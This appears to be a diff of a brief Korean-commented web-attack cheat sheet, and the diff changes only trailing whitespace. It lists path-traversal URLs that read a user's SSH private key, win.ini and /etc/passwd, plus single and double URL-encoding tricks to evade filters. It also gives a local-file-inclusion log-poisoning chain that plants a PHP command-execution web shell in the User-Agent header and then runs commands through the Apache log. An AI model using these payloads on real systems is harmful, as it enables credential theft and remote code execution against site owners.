@@ -1,14 +1,14 @@
-# Directory Traversal (Path Traversal)
-https://example.com/cms/login.php?language=en.html                           # language 파라미터로 특정 파일을 불러오는 정상 요청
-https://example.com/cms/login.php?language=../../../../home/kali/.ssh/id_rsa # 리눅스 사용자 SSH 개인키 접근
-https://example.com/cms/login.php?language=..\..\..\..\windows\win.ini       # Windows 시스템 설정 파일(win.ini) 접근
+# Directory Traversal (Path Traversal)  
+https://example.com/cms/login.php?language=en.html                           # language 파라미터로 특정 파일을 불러오는 정상 요청  
+https://example.com/cms/login.php?language=../../../../home/kali/.ssh/id_rsa # 리눅스 사용자 SSH 개인키 접근  
+https://example.com/cms/login.php?language=..\..\..\..\windows\win.ini       # Windows 시스템 설정 파일(win.ini) 접근  
 
-# 인코딩이 필요할때
-1  ../../../../etc/passwd                                                       # 리눅스 사용자 계정 정보
-2  %2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                       # '.'을 %2e로 인코딩하여 필터 우회
-3  %252e%252e/%252e%252e/etc/passwd                                             # 이중 인코딩(Double Encoding)으로 필터 우회
+# 인코딩이 필요할때  
+1  ../../../../etc/passwd                                                       # 리눅스 사용자 계정 정보  
+2  %2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                       # '.'을 %2e로 인코딩하여 필터 우회  
+3  %252e%252e/%252e%252e/etc/passwd                                             # 이중 인코딩(Double Encoding)으로 필터 우회  
 
-# Local File Inclusion (LFI) - Log Poisoning
+# Local File Inclusion (LFI) - Log Poisoning  
 curl https://example.com/index.php?page=../../../../../../../../../var/log/apache2/access.log   # Apache access.log를 LFI로 불러오기
 User-Agent: <p><?php system($_REQUEST['cmd']); ?></p>                                           # User-Agent에 PHP 코드 삽입(Log Poisoning)
 ../var/log/apache2/access.log&cmd=whoami                                                        # 삽입된 PHP 코드로 명령 실행
